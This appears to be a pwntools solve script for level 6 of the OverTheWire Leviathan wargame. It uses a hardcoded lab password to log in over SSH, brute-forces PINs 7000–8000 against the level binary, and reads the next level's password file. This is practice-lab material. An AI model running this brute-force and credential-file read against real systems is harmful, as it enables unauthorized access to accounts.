#!/usr/bin/env python2
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter
from pwnlib.util.fiddling import randoms
from time import sleep

level = 6
user = 'leviathan%s' % level
host = 'leviathan.labs.overthewire.org'
password = 'UgaoFee4li'
port = 2223

def connectToLevel():
    return ssh(user=user, host=host, port=port, password=password)

def getPass(shell):
    shell.sendline('cat /etc/leviathan_pass/leviathan%s' % (level+1))
    flag = shell.recvuntil('$').split()[0]
    log.info('Flag = %s' % flag)
    shell.close()
    return flag

context(arch='i386', os='linux')

sh = connectToLevel()
exe = sh.run('for pin in {7000..8000}; do echo $pin; ./leviathan6 $pin; done')
exe.recvuntil('$')
flag = getPass(exe)